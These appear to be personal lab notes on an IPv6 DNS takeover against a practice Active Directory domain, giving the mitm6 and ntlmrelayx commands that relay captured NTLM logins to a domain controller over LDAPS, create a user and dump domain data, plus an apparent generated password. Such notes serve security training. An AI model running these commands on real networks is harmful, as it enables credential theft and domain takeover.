
This is one of the craziest attack that we can pull of without any access.
```
mitm6 -d marvel.local
```

Before running the above command we have to run the ntlm relay
```
ntlmrelayx.py -6 -t ldaps://192.168.17.139 -wh fakewpad.marvel.local -l lootme 
```
![[Pasted image 20240122221820.png]]
Make Sure there are no error and it should run like this

We can only run mitm6 in small sprints (i.e. 5-10 minutes) otherwise it will create shortages and to trigger the event will simply reboot the machine and than the relay effect will come into play and will get the hashes dump

So let's simulate that on the network:
As the mitm6 get started Ip address will get started to get assigned here.
So with that we are becoming MITM6 for these servers here.
![[Pasted image 20240227202743.png]]

When an event occurs on the network and that could be as simple as reboot of a machine (i.e. somebody logging into a machine) and than relay it using ntlm relay to the domain controller.

After an admin login's we get a lootdir
![[Pasted image 20240227204206.png]]

When we reboot we get this successful authentication
![[Pasted image 20240227204802.png]]

Login as admin

![[Pasted image 20240227205620.png]]
![[Pasted image 20240227205648.png]]

So lets check if the user has been created or not ?_?
Tools -> Active Directory Users and Computers
![[Pasted image 20240227210642.png]]

```
KRTaxsWEiV
```
![[Pasted image 20240227210749.png]]


![[Pasted image 20240227210851.png]]

